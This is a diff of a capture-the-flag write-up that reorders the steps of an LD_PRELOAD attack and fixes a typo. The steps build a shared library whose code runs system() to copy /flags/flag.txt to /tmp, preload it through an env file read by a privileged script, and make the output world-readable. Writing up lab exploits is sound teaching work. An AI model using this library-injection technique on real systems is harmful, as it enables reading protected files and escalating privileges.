@@ -75,20 +75,19 @@ We present below the code we used to complete the CTF.
 >   system(\"/usr/bin/cat /flags/flag.txt > /tmp/myfile.txt \");
 >   return 0;
 >} " >> printenv.c
->
->gcc -fPIC -g -c printenv.c 
 >```
 >Create a library with our printenv.c.
 >```
+>gcc -fPIC -g -c printenv.c 
 >gcc -shared -o libmylib.so.1.0.1 printenv.o -lc 
 >```
->Preloads the library to env file, which is used in the script back in /flag_reader, so that our code runs before anyother library. 
+>Preloads the library to env file, which is used in the script back in /flag_reader, so that our code runs before any other library. 
 >```
 >echo "LD_PRELOAD=/tmp/libmylib.so.1.0.1" >> env 
->touch myfile.txt
 >```
 >Change file permissions.
 >```
+>touch myfile.txt
 >chmod 777 myfile.txt 
 >```
 >Immediately after the script in the flag_reader folder is executed to get the content from the file.
